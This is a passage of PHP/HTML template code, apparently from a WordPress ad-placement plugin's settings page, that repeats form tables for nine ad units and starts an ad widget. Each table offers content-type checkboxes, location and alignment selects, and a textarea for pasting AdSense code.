										<input type="hidden" name="action" value="save" />
									</div>
								</th>
							</tr>
						</thead>

						<tr>
							<td width="250px">


									<strong style="font-size:11px; font-weight:bold;">Type of content the ad should appear on:</strong><BR>

									<input type="checkbox" name="bw_addunit1_home" id="bw_addunit1_home" value="true" <?php if (get_option('bw_addunit1_home')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit1_home">Home</label><br />

									<input type="checkbox" name="bw_addunit1_page" id="bw_addunit1_page" value="true" <?php if (get_option('bw_addunit1_page')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit1_page">Page</label><br />

									<input type="checkbox" name="bw_addunit1_post" id="bw_addunit1_post" value="true" <?php if (get_option('bw_addunit1_post')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit1_post">Post</label><br />

									<input type="checkbox" name="bw_addunit1_category" id="bw_addunit1_category" value="true" <?php if (get_option('bw_addunit1_category')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit1_category">Category</label><br />

									<input type="checkbox" name="bw_addunit1_search" id="bw_addunit1_search" value="true" <?php if (get_option('bw_addunit1_search')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit1_search">Search</label><br />

									<input type="checkbox" name="bw_addunit1_archive" id="bw_addunit1_archive" value="true" <?php if (get_option('bw_addunit1_archive')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit1_archive">Archive</label><br />
									<BR>
									<strong style="font-size:11px; font-weight:bold;">Location the ad should appear:</strong><BR>
									<select name="bw_addunit1_location" id="bw_addunit1_location" style="width:200px;">
									<option value="0" <?php if (get_option('bw_addunit1_location')=='0') echo ' selected ' ?> >Don't show this ad</option>
									<option value="1" <?php if (get_option('bw_addunit1_location')=='1') echo ' selected ' ?> >Before blog</option>
									<option value="5" <?php if (get_option('bw_addunit1_location')=='5') echo ' selected ' ?> >Before content</option>
									<option value="6" <?php if (get_option('bw_addunit1_location')=='6') echo ' selected ' ?> >Middle of content (after 4th paragraph)</option>
									<option value="7" <?php if (get_option('bw_addunit1_location')=='7') echo ' selected ' ?> >After content</option>
									</select>
									<BR><BR>
									<strong style="font-size:11px; font-weight:bold;">Alignment of the ad (left, right, center):</strong><BR>
									<select name="bw_addunit1_alignment" id="bw_addunit1_alignment" style="width:200px;">
									<option value="0" <?php if (get_option('bw_addunit1_alignment')=='0') echo ' selected ' ?> >Left</option>
									<option value="1" <?php if (get_option('bw_addunit1_alignment')=='1') echo ' selected ' ?> >Right</option>
									<option value="2" <?php if (get_option('bw_addunit1_alignment')=='2') echo ' selected ' ?> >Center</option>
									</select>
									<BR>
							</td>
							<td width="350px">
							<strong style="font-size:11px; font-weight:bold;">Enter/Paste Google Adsense code:</strong><BR>

							<textarea name="bw_addunit1_text" id="bw_addunit1_text" style="width:340px; height:220px; font-size:11px;" cols="" rows=""><?php echo get_option('bw_addunit1_text'); ?></textarea>
							</td>
						</tr>


											</tbody></table>
<BR><BR>
										<table class="widefat" cellspacing="0" style="width:600px;"><tbody>

											<thead>
							<tr>
								<th colspan="2" scope="col">
									Ad Unit 2
									<div style="float:right">
										<input name="save" type="submit" value="Save" class="button-primary"/>
										<input type="hidden" name="action" value="save" />
									</div>
								</th>
							</tr>
						</thead>

						<tr>
							<td width="250px">


									<strong style="font-size:11px; font-weight:bold;">Type of content the ad should appear on:</strong><BR>

									<input type="checkbox" name="bw_addunit2_home" id="bw_addunit2_home" value="true" <?php if (get_option('bw_addunit2_home')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit2_home">Home</label><br />

									<input type="checkbox" name="bw_addunit2_page" id="bw_addunit2_page" value="true" <?php if (get_option('bw_addunit2_page')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit2_page">Page</label><br />

									<input type="checkbox" name="bw_addunit2_post" id="bw_addunit2_post" value="true" <?php if (get_option('bw_addunit2_post')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit2_post">Post</label><br />

									<input type="checkbox" name="bw_addunit2_category" id="bw_addunit2_category" value="true" <?php if (get_option('bw_addunit2_category')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit2_category">Category</label><br />

									<input type="checkbox" name="bw_addunit2_search" id="bw_addunit2_search" value="true" <?php if (get_option('bw_addunit2_search')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit2_search">Search</label><br />

									<input type="checkbox" name="bw_addunit2_archive" id="bw_addunit2_archive" value="true" <?php if (get_option('bw_addunit2_archive')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit2_archive">Archive</label><br />
									<BR>
									<strong style="font-size:11px; font-weight:bold;">Location the ad should appear:</strong><BR>
									<select name="bw_addunit2_location" id="bw_addunit2_location" style="width:200px;">
									<option value="0" <?php if (get_option('bw_addunit2_location')=='0') echo ' selected ' ?> >Don't show this ad</option>
									<option value="1" <?php if (get_option('bw_addunit2_location')=='1') echo ' selected ' ?> >Before blog</option>
									<option value="5" <?php if (get_option('bw_addunit2_location')=='5') echo ' selected ' ?> >Before content</option>
									<option value="6" <?php if (get_option('bw_addunit2_location')=='6') echo ' selected ' ?> >Middle of content (after 4th paragraph)</option>
									<option value="7" <?php if (get_option('bw_addunit2_location')=='7') echo ' selected ' ?> >After content</option>
									</select>
									<BR><BR>
									<strong style="font-size:11px; font-weight:bold;">Alignment of the ad (left, right, center):</strong><BR>
									<select name="bw_addunit2_alignment" id="bw_addunit2_alignment" style="width:200px;">
									<option value="0" <?php if (get_option('bw_addunit2_alignment')=='0') echo ' selected ' ?> >Left</option>
									<option value="1" <?php if (get_option('bw_addunit2_alignment')=='1') echo ' selected ' ?> >Right</option>
									<option value="2" <?php if (get_option('bw_addunit2_alignment')=='2') echo ' selected ' ?> >Center</option>
									</select>
									<BR>
							</td>
							<td width="350px">
							<strong style="font-size:11px; font-weight:bold;">Enter/Paste Google Adsense code:</strong><BR>

							<textarea name="bw_addunit2_text" id="bw_addunit2_text" style="width:340px; height:220px; font-size:11px;" cols="" rows=""><?php echo get_option('bw_addunit2_text'); ?></textarea>
							</td>
						</tr>


											</tbody></table>
<BR><BR>
										<table class="widefat" cellspacing="0" style="width:600px;"><tbody>

											<thead>
							<tr>
								<th colspan="2" scope="col">
									Ad Unit 3
									<div style="float:right">
										<input name="save" type="submit" value="Save" class="button-primary"/>
										<input type="hidden" name="action" value="save" />
									</div>
								</th>
							</tr>
						</thead>

						<tr>
							<td width="250px">


									<strong style="font-size:11px; font-weight:bold;">Type of content the ad should appear on:</strong><BR>

									<input type="checkbox" name="bw_addunit3_home" id="bw_addunit3_home" value="true" <?php if (get_option('bw_addunit3_home')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit3_home">Home</label><br />

									<input type="checkbox" name="bw_addunit3_page" id="bw_addunit3_page" value="true" <?php if (get_option('bw_addunit3_page')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit3_page">Page</label><br />

									<input type="checkbox" name="bw_addunit3_post" id="bw_addunit3_post" value="true" <?php if (get_option('bw_addunit3_post')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit3_post">Post</label><br />

									<input type="checkbox" name="bw_addunit3_category" id="bw_addunit3_category" value="true" <?php if (get_option('bw_addunit3_category')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit3_category">Category</label><br />

									<input type="checkbox" name="bw_addunit3_search" id="bw_addunit3_search" value="true" <?php if (get_option('bw_addunit3_search')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit3_search">Search</label><br />

									<input type="checkbox" name="bw_addunit3_archive" id="bw_addunit3_archive" value="true" <?php if (get_option('bw_addunit3_archive')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit3_archive">Archive</label><br />
									<BR>
									<strong style="font-size:11px; font-weight:bold;">Location the ad should appear:</strong><BR>
									<select name="bw_addunit3_location" id="bw_addunit3_location" style="width:200px;">
									<option value="0" <?php if (get_option('bw_addunit3_location')=='0') echo ' selected ' ?> >Don't show this ad</option>
									<option value="1" <?php if (get_option('bw_addunit3_location')=='1') echo ' selected ' ?> >Before blog</option>
									<option value="5" <?php if (get_option('bw_addunit3_location')=='5') echo ' selected ' ?> >Before content</option>
									<option value="6" <?php if (get_option('bw_addunit3_location')=='6') echo ' selected ' ?> >Middle of content (after 4th paragraph)</option>
									<option value="7" <?php if (get_option('bw_addunit3_location')=='7') echo ' selected ' ?> >After content</option>
									</select>
									<BR><BR>
									<strong style="font-size:11px; font-weight:bold;">Alignment of the ad (left, right, center):</strong><BR>
									<select name="bw_addunit3_alignment" id="bw_addunit3_alignment" style="width:200px;">
									<option value="0" <?php if (get_option('bw_addunit3_alignment')=='0') echo ' selected ' ?> >Left</option>
									<option value="1" <?php if (get_option('bw_addunit3_alignment')=='1') echo ' selected ' ?> >Right</option>
									<option value="2" <?php if (get_option('bw_addunit3_alignment')=='2') echo ' selected ' ?> >Center</option>
									</select>
									<BR>
							</td>
							<td width="350px">
							<strong style="font-size:11px; font-weight:bold;">Enter/Paste Google Adsense code:</strong><BR>

							<textarea name="bw_addunit3_text" id="bw_addunit3_text" style="width:340px; height:220px; font-size:11px;" cols="" rows=""><?php echo get_option('bw_addunit3_text'); ?></textarea>
							</td>
						</tr>


											</tbody></table>
<BR><BR>
										<table class="widefat" cellspacing="0" style="width:600px;"><tbody>

											<thead>
							<tr>
								<th colspan="2" scope="col">
									Ad Unit 4
									<div style="float:right">
										<input name="save" type="submit" value="Save" class="button-primary"/>
										<input type="hidden" name="action" value="save" />
									</div>
								</th>
							</tr>
						</thead>

						<tr>
							<td width="250px">


									<strong style="font-size:11px; font-weight:bold;">Type of content the ad should appear on:</strong><BR>

									<input type="checkbox" name="bw_addunit4_home" id="bw_addunit4_home" value="true" <?php if (get_option('bw_addunit4_home')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit4_home">Home</label><br />

									<input type="checkbox" name="bw_addunit4_page" id="bw_addunit4_page" value="true" <?php if (get_option('bw_addunit4_page')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit4_page">Page</label><br />

									<input type="checkbox" name="bw_addunit4_post" id="bw_addunit4_post" value="true" <?php if (get_option('bw_addunit4_post')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit4_post">Post</label><br />

									<input type="checkbox" name="bw_addunit4_category" id="bw_addunit4_category" value="true" <?php if (get_option('bw_addunit4_category')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit4_category">Category</label><br />

									<input type="checkbox" name="bw_addunit4_search" id="bw_addunit4_search" value="true" <?php if (get_option('bw_addunit4_search')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit4_search">Search</label><br />

									<input type="checkbox" name="bw_addunit4_archive" id="bw_addunit4_archive" value="true" <?php if (get_option('bw_addunit4_archive')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit4_archive">Archive</label><br />
									<BR>
									<strong style="font-size:11px; font-weight:bold;">Location the ad should appear:</strong><BR>
									<select name="bw_addunit4_location" id="bw_addunit4_location" style="width:200px;">
									<option value="0" <?php if (get_option('bw_addunit4_location')=='0') echo ' selected ' ?> >Don't show this ad</option>
									<option value="1" <?php if (get_option('bw_addunit4_location')=='1') echo ' selected ' ?> >Before blog</option>
									<option value="5" <?php if (get_option('bw_addunit4_location')=='5') echo ' selected ' ?> >Before content</option>
									<option value="6" <?php if (get_option('bw_addunit4_location')=='6') echo ' selected ' ?> >Middle of content (after 4th paragraph)</option>
									<option value="7" <?php if (get_option('bw_addunit4_location')=='7') echo ' selected ' ?> >After content</option>
									</select>
									<BR><BR>
									<strong style="font-size:11px; font-weight:bold;">Alignment of the ad (left, right, center):</strong><BR>
									<select name="bw_addunit4_alignment" id="bw_addunit4_alignment" style="width:200px;">
									<option value="0" <?php if (get_option('bw_addunit4_alignment')=='0') echo ' selected ' ?> >Left</option>
									<option value="1" <?php if (get_option('bw_addunit4_alignment')=='1') echo ' selected ' ?> >Right</option>
									<option value="2" <?php if (get_option('bw_addunit4_alignment')=='2') echo ' selected ' ?> >Center</option>
									</select>
									<BR>
							</td>
							<td width="350px">
							<strong style="font-size:11px; font-weight:bold;">Enter/Paste Google Adsense code:</strong><BR>

							<textarea name="bw_addunit4_text" id="bw_addunit4_text" style="width:340px; height:220px; font-size:11px;" cols="" rows=""><?php echo get_option('bw_addunit4_text'); ?></textarea>
							</td>
						</tr>


											</tbody></table>
<BR><BR>
										<table class="widefat" cellspacing="0" style="width:600px;"><tbody>

											<thead>
							<tr>
								<th colspan="2" scope="col">
									Ad Unit 5
									<div style="float:right">
										<input name="save" type="submit" value="Save" class="button-primary"/>
										<input type="hidden" name="action" value="save" />
									</div>
								</th>
							</tr>
						</thead>

						<tr>
							<td width="250px">


									<strong style="font-size:11px; font-weight:bold;">Type of content the ad should appear on:</strong><BR>

									<input type="checkbox" name="bw_addunit5_home" id="bw_addunit5_home" value="true" <?php if (get_option('bw_addunit5_home')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit5_home">Home</label><br />

									<input type="checkbox" name="bw_addunit5_page" id="bw_addunit5_page" value="true" <?php if (get_option('bw_addunit5_page')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit5_page">Page</label><br />

									<input type="checkbox" name="bw_addunit5_post" id="bw_addunit5_post" value="true" <?php if (get_option('bw_addunit5_post')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit5_post">Post</label><br />

									<input type="checkbox" name="bw_addunit5_category" id="bw_addunit5_category" value="true" <?php if (get_option('bw_addunit5_category')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit5_category">Category</label><br />

									<input type="checkbox" name="bw_addunit5_search" id="bw_addunit5_search" value="true" <?php if (get_option('bw_addunit5_search')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit5_search">Search</label><br />

									<input type="checkbox" name="bw_addunit5_archive" id="bw_addunit5_archive" value="true" <?php if (get_option('bw_addunit5_archive')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit5_archive">Archive</label><br />
									<BR>
									<strong style="font-size:11px; font-weight:bold;">Location the ad should appear:</strong><BR>
									<select name="bw_addunit5_location" id="bw_addunit5_location" style="width:200px;">
									<option value="0" <?php if (get_option('bw_addunit5_location')=='0') echo ' selected ' ?> >Don't show this ad</option>
									<option value="1" <?php if (get_option('bw_addunit5_location')=='1') echo ' selected ' ?> >Before blog</option>
									<option value="5" <?php if (get_option('bw_addunit5_location')=='5') echo ' selected ' ?> >Before content</option>
									<option value="6" <?php if (get_option('bw_addunit5_location')=='6') echo ' selected ' ?> >Middle of content (after 4th paragraph)</option>
									<option value="7" <?php if (get_option('bw_addunit5_location')=='7') echo ' selected ' ?> >After content</option>
									</select>
									<BR><BR>
									<strong style="font-size:11px; font-weight:bold;">Alignment of the ad (left, right, center):</strong><BR>
									<select name="bw_addunit5_alignment" id="bw_addunit5_alignment" style="width:200px;">
									<option value="0" <?php if (get_option('bw_addunit5_alignment')=='0') echo ' selected ' ?> >Left</option>
									<option value="1" <?php if (get_option('bw_addunit5_alignment')=='1') echo ' selected ' ?> >Right</option>
									<option value="2" <?php if (get_option('bw_addunit5_alignment')=='2') echo ' selected ' ?> >Center</option>
									</select>
									<BR>
							</td>
							<td width="350px">
							<strong style="font-size:11px; font-weight:bold;">Enter/Paste Google Adsense code:</strong><BR>

							<textarea name="bw_addunit5_text" id="bw_addunit5_text" style="width:340px; height:220px; font-size:11px;" cols="" rows=""><?php echo get_option('bw_addunit5_text'); ?></textarea>
							</td>
						</tr>


											</tbody></table>
<BR><BR>
										<table class="widefat" cellspacing="0" style="width:600px;"><tbody>

											<thead>
							<tr>
								<th colspan="2" scope="col">
									Ad Unit 6
									<div style="float:right">
										<input name="save" type="submit" value="Save" class="button-primary"/>
										<input type="hidden" name="action" value="save" />
									</div>
								</th>
							</tr>
						</thead>

						<tr>
							<td width="250px">


									<strong style="font-size:11px; font-weight:bold;">Type of content the ad should appear on:</strong><BR>

									<input type="checkbox" name="bw_addunit6_home" id="bw_addunit6_home" value="true" <?php if (get_option('bw_addunit6_home')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit6_home">Home</label><br />

									<input type="checkbox" name="bw_addunit6_page" id="bw_addunit6_page" value="true" <?php if (get_option('bw_addunit6_page')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit6_page">Page</label><br />

									<input type="checkbox" name="bw_addunit6_post" id="bw_addunit6_post" value="true" <?php if (get_option('bw_addunit6_post')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit6_post">Post</label><br />

									<input type="checkbox" name="bw_addunit6_category" id="bw_addunit6_category" value="true" <?php if (get_option('bw_addunit6_category')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit6_category">Category</label><br />

									<input type="checkbox" name="bw_addunit6_search" id="bw_addunit6_search" value="true" <?php if (get_option('bw_addunit6_search')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit6_search">Search</label><br />

									<input type="checkbox" name="bw_addunit6_archive" id="bw_addunit6_archive" value="true" <?php if (get_option('bw_addunit6_archive')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit6_archive">Archive</label><br />
									<BR>
									<strong style="font-size:11px; font-weight:bold;">Location the ad should appear:</strong><BR>
									<select name="bw_addunit6_location" id="bw_addunit6_location" style="width:200px;">
									<option value="0" <?php if (get_option('bw_addunit6_location')=='0') echo ' selected ' ?> >Don't show this ad</option>
									<option value="1" <?php if (get_option('bw_addunit6_location')=='1') echo ' selected ' ?> >Before blog</option>
									<option value="5" <?php if (get_option('bw_addunit6_location')=='5') echo ' selected ' ?> >Before content</option>
									<option value="6" <?php if (get_option('bw_addunit6_location')=='6') echo ' selected ' ?> >Middle of content (after 4th paragraph)</option>
									<option value="7" <?php if (get_option('bw_addunit6_location')=='7') echo ' selected ' ?> >After content</option>
									</select>
									<BR><BR>
									<strong style="font-size:11px; font-weight:bold;">Alignment of the ad (left, right, center):</strong><BR>
									<select name="bw_addunit6_alignment" id="bw_addunit6_alignment" style="width:200px;">
									<option value="0" <?php if (get_option('bw_addunit6_alignment')=='0') echo ' selected ' ?> >Left</option>
									<option value="1" <?php if (get_option('bw_addunit6_alignment')=='1') echo ' selected ' ?> >Right</option>
									<option value="2" <?php if (get_option('bw_addunit6_alignment')=='2') echo ' selected ' ?> >Center</option>
									</select>
									<BR>
							</td>
							<td width="350px">
							<strong style="font-size:11px; font-weight:bold;">Enter/Paste Google Adsense code:</strong><BR>

							<textarea name="bw_addunit6_text" id="bw_addunit6_text" style="width:340px; height:220px; font-size:11px;" cols="" rows=""><?php echo get_option('bw_addunit6_text'); ?></textarea>
							</td>
						</tr>


											</tbody></table>
<BR><BR>
										<table class="widefat" cellspacing="0" style="width:600px;"><tbody>

											<thead>
							<tr>
								<th colspan="2" scope="col">
									Ad Unit 7
									<div style="float:right">
										<input name="save" type="submit" value="Save" class="button-primary"/>
										<input type="hidden" name="action" value="save" />
									</div>
								</th>
							</tr>
						</thead>

						<tr>
							<td width="250px">


									<strong style="font-size:11px; font-weight:bold;">Type of content the ad should appear on:</strong><BR>

									<input type="checkbox" name="bw_addunit7_home" id="bw_addunit7_home" value="true" <?php if (get_option('bw_addunit7_home')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit7_home">Home</label><br />

									<input type="checkbox" name="bw_addunit7_page" id="bw_addunit7_page" value="true" <?php if (get_option('bw_addunit7_page')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit7_page">Page</label><br />

									<input type="checkbox" name="bw_addunit7_post" id="bw_addunit7_post" value="true" <?php if (get_option('bw_addunit7_post')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit7_post">Post</label><br />

									<input type="checkbox" name="bw_addunit7_category" id="bw_addunit7_category" value="true" <?php if (get_option('bw_addunit7_category')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit7_category">Category</label><br />

									<input type="checkbox" name="bw_addunit7_search" id="bw_addunit7_search" value="true" <?php if (get_option('bw_addunit7_search')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit7_search">Search</label><br />

									<input type="checkbox" name="bw_addunit7_archive" id="bw_addunit7_archive" value="true" <?php if (get_option('bw_addunit7_archive')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit7_archive">Archive</label><br />
									<BR>
									<strong style="font-size:11px; font-weight:bold;">Location the ad should appear:</strong><BR>
									<select name="bw_addunit7_location" id="bw_addunit7_location" style="width:200px;">
									<option value="0" <?php if (get_option('bw_addunit7_location')=='0') echo ' selected ' ?> >Don't show this ad</option>
									<option value="1" <?php if (get_option('bw_addunit7_location')=='1') echo ' selected ' ?> >Before blog</option>
									<option value="5" <?php if (get_option('bw_addunit7_location')=='5') echo ' selected ' ?> >Before content</option>
									<option value="6" <?php if (get_option('bw_addunit7_location')=='6') echo ' selected ' ?> >Middle of content (after 4th paragraph)</option>
									<option value="7" <?php if (get_option('bw_addunit7_location')=='7') echo ' selected ' ?> >After content</option>
									</select>
									<BR><BR>
									<strong style="font-size:11px; font-weight:bold;">Alignment of the ad (left, right, center):</strong><BR>
									<select name="bw_addunit7_alignment" id="bw_addunit7_alignment" style="width:200px;">
									<option value="0" <?php if (get_option('bw_addunit7_alignment')=='0') echo ' selected ' ?> >Left</option>
									<option value="1" <?php if (get_option('bw_addunit7_alignment')=='1') echo ' selected ' ?> >Right</option>
									<option value="2" <?php if (get_option('bw_addunit7_alignment')=='2') echo ' selected ' ?> >Center</option>
									</select>
									<BR>
							</td>
							<td width="350px">
							<strong style="font-size:11px; font-weight:bold;">Enter/Paste Google Adsense code:</strong><BR>

							<textarea name="bw_addunit7_text" id="bw_addunit7_text" style="width:340px; height:220px; font-size:11px;" cols="" rows=""><?php echo get_option('bw_addunit7_text'); ?></textarea>
							</td>
						</tr>


											</tbody></table>
<BR><BR>
										<table class="widefat" cellspacing="0" style="width:600px;"><tbody>

											<thead>
							<tr>
								<th colspan="2" scope="col">
									Ad Unit 8
									<div style="float:right">
										<input name="save" type="submit" value="Save" class="button-primary"/>
										<input type="hidden" name="action" value="save" />
									</div>
								</th>
							</tr>
						</thead>

						<tr>
							<td width="250px">


									<strong style="font-size:11px; font-weight:bold;">Type of content the ad should appear on:</strong><BR>

									<input type="checkbox" name="bw_addunit8_home" id="bw_addunit8_home" value="true" <?php if (get_option('bw_addunit8_home')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit8_home">Home</label><br />

									<input type="checkbox" name="bw_addunit8_page" id="bw_addunit8_page" value="true" <?php if (get_option('bw_addunit8_page')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit8_page">Page</label><br />

									<input type="checkbox" name="bw_addunit8_post" id="bw_addunit8_post" value="true" <?php if (get_option('bw_addunit8_post')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit8_post">Post</label><br />

									<input type="checkbox" name="bw_addunit8_category" id="bw_addunit8_category" value="true" <?php if (get_option('bw_addunit8_category')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit8_category">Category</label><br />

									<input type="checkbox" name="bw_addunit8_search" id="bw_addunit8_search" value="true" <?php if (get_option('bw_addunit8_search')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit8_search">Search</label><br />

									<input type="checkbox" name="bw_addunit8_archive" id="bw_addunit8_archive" value="true" <?php if (get_option('bw_addunit8_archive')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit8_archive">Archive</label><br />
									<BR>
									<strong style="font-size:11px; font-weight:bold;">Location the ad should appear:</strong><BR>
									<select name="bw_addunit8_location" id="bw_addunit8_location" style="width:200px;">
									<option value="0" <?php if (get_option('bw_addunit8_location')=='0') echo ' selected ' ?> >Don't show this ad</option>
									<option value="1" <?php if (get_option('bw_addunit8_location')=='1') echo ' selected ' ?> >Before blog</option>
									<option value="5" <?php if (get_option('bw_addunit8_location')=='5') echo ' selected ' ?> >Before content</option>
									<option value="6" <?php if (get_option('bw_addunit8_location')=='6') echo ' selected ' ?> >Middle of content (after 4th paragraph)</option>
									<option value="7" <?php if (get_option('bw_addunit8_location')=='7') echo ' selected ' ?> >After content</option>
									</select>
									<BR><BR>
									<strong style="font-size:11px; font-weight:bold;">Alignment of the ad (left, right, center):</strong><BR>
									<select name="bw_addunit8_alignment" id="bw_addunit8_alignment" style="width:200px;">
									<option value="0" <?php if (get_option('bw_addunit8_alignment')=='0') echo ' selected ' ?> >Left</option>
									<option value="1" <?php if (get_option('bw_addunit8_alignment')=='1') echo ' selected ' ?> >Right</option>
									<option value="2" <?php if (get_option('bw_addunit8_alignment')=='2') echo ' selected ' ?> >Center</option>
									</select>
									<BR>
							</td>
							<td width="350px">
							<strong style="font-size:11px; font-weight:bold;">Enter/Paste Google Adsense code:</strong><BR>

							<textarea name="bw_addunit8_text" id="bw_addunit8_text" style="width:340px; height:220px; font-size:11px;" cols="" rows=""><?php echo get_option('bw_addunit8_text'); ?></textarea>
							</td>
						</tr>


											</tbody></table>
<BR><BR>
										<table class="widefat" cellspacing="0" style="width:600px;"><tbody>

											<thead>
							<tr>
								<th colspan="2" scope="col">
									Ad Unit 9
									<div style="float:right">
										<input name="save" type="submit" value="Save" class="button-primary"/>
										<input type="hidden" name="action" value="save" />
									</div>
								</th>
							</tr>
						</thead>

						<tr>
							<td width="250px">


									<strong style="font-size:11px; font-weight:bold;">Type of content the ad should appear on:</strong><BR>

									<input type="checkbox" name="bw_addunit9_home" id="bw_addunit9_home" value="true" <?php if (get_option('bw_addunit9_home')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit9_home">Home</label><br />

									<input type="checkbox" name="bw_addunit9_page" id="bw_addunit9_page" value="true" <?php if (get_option('bw_addunit9_page')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit9_page">Page</label><br />

									<input type="checkbox" name="bw_addunit9_post" id="bw_addunit9_post" value="true" <?php if (get_option('bw_addunit9_post')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit9_post">Post</label><br />

									<input type="checkbox" name="bw_addunit9_category" id="bw_addunit9_category" value="true" <?php if (get_option('bw_addunit9_category')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit9_category">Category</label><br />

									<input type="checkbox" name="bw_addunit9_search" id="bw_addunit9_search" value="true" <?php if (get_option('bw_addunit9_search')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit9_search">Search</label><br />

									<input type="checkbox" name="bw_addunit9_archive" id="bw_addunit9_archive" value="true" <?php if (get_option('bw_addunit9_archive')=='true') echo ' checked="checked" ' ?> /> <label for="bw_addunit9_archive">Archive</label><br />
									<BR>
									<strong style="font-size:11px; font-weight:bold;">Location the ad should appear:</strong><BR>
									<select name="bw_addunit9_location" id="bw_addunit9_location" style="width:200px;">
									<option value="0" <?php if (get_option('bw_addunit9_location')=='0') echo ' selected ' ?> >Don't show this ad</option>
									<option value="1" <?php if (get_option('bw_addunit9_location')=='1') echo ' selected ' ?> >Before blog</option>
									<option value="5" <?php if (get_option('bw_addunit9_location')=='5') echo ' selected ' ?> >Before content</option>
									<option value="6" <?php if (get_option('bw_addunit9_location')=='6') echo ' selected ' ?> >Middle of content (after 4th paragraph)</option>
									<option value="7" <?php if (get_option('bw_addunit9_location')=='7') echo ' selected ' ?> >After content</option>
									</select>
									<BR><BR>
									<strong style="font-size:11px; font-weight:bold;">Alignment of the ad (left, right, center):</strong><BR>
									<select name="bw_addunit9_alignment" id="bw_addunit9_alignment" style="width:200px;">
									<option value="0" <?php if (get_option('bw_addunit9_alignment')=='0') echo ' selected ' ?> >Left</option>
									<option value="1" <?php if (get_option('bw_addunit9_alignment')=='1') echo ' selected ' ?> >Right</option>
									<option value="2" <?php if (get_option('bw_addunit9_alignment')=='2') echo ' selected ' ?> >Center</option>
									</select>
									<BR>
							</td>
							<td width="350px">
							<strong style="font-size:11px; font-weight:bold;">Enter/Paste Google Adsense code:</strong><BR>

							<textarea name="bw_addunit9_text" id="bw_addunit9_text" style="width:340px; height:220px; font-size:11px;" cols="" rows=""><?php echo get_option('bw_addunit9_text'); ?></textarea>
							</td>
						</tr>


											</tbody></table>

<BR><BR>
										<table class="widefat" cellspacing="0" style="width:600px;"><tbody>

											<thead>
							<tr>
								<th colspan="2" scope="col" style="background-color: #81DAF5;">
									Ad Widget 1
									<div style="float:right">
										<input name="save" type="submit" value="Save" class="button-primary"/>
										<input type="hidden" name="action" value="save" />
									</div>
								</th>
							</tr>
						</thead>

						<tr>
							<td width="250px">


									<strong style="font-size:11px; font-weight:bold;">Type of content the ad should appear on:</strong><BR>

									<input type="checkbox" name="bw_adwidget1_home" id="bw_adwidget1_home" value="true" <?php if (get_option('bw_adwidget1_home')=='true') echo ' checked="checked" ' ?> /> <label for="bw_adwidget1_home">Home</label><br />

									<input type="checkbox" name="bw_adwidget1_page" id="bw_adwidget1_page" value="true" <?php if (get_option('bw_adwidget1_page')=='true') echo ' checked="checked" ' ?> /> <label for="bw_adwidget1_page">Page</label><br />

									<input type="checkbox" name="bw_adwidget1_post" id="bw_adwidget1_post" value="true" <?php if (get_option('bw_adwidget1_post')=='true') echo ' checked="checked" ' ?> /> <label for="bw_adwidget1_post">Post</label><br />

									<input type="checkbox" name="bw_adwidget1_category" id="bw_adwidget1_category" value="true" <?php if (get_option('bw_adwidget1_category')=='true') echo ' checked="checked" ' ?> /> <label for="bw_adwidget1_category">Category</label><br />

									<input type="checkbox" name="bw_adwidget1_search" id="bw_adwidget1_search" value="true" <?php if (get_option('bw_adwidget1_search')=='true') echo ' checked="checked" ' ?> /> <label for="bw_adwidget1_search">Search</label><br />

									<input type="checkbox" name="bw_adwidget1_archive" id="bw_adwidget1_archive" value="true" <?php if (get_option('bw_adwidget1_archive')=='true') echo ' checked="checked" ' ?> /> <label for="bw_adwidget1_archive">Archive</label><br />
									<BR>
							</td>
							<td width="350px">
